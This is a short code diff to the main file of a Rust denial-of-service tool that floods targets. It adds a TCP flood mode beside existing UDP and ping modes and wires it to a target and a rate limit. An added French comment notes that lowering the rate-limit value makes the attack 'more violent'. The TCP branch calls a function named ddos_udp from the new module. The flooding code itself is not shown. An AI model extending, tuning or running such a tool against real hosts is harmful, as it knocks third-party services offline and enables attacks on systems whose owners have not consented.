@@ -1,5 +1,6 @@
 mod ddos_udp;
 mod ddos_ping;
+mod ddos_tcp;
 
 use tokio;
 use std::error::Error;
@@ -24,7 +25,7 @@ async fn chrono(tx: mpsc::Sender<()>, ddos_time:u64) {
 async fn main() {
 
     //ENV VARIBALES
-    let rate_limite:u64 = 100000;
+    let rate_limite:u64 = 100000; // plus on baisse plus c'estt violent
 
 
     //ENV VARIBALES
@@ -61,6 +62,7 @@ async fn main() {
         },
         "tcp" => {
             println!("tcp ddos");
+            ddos_tcp::ddos_udp(&mut rx, target,rate_limite).await;
         },
         "ping" => {
             let target = format!("{}", args[1]);
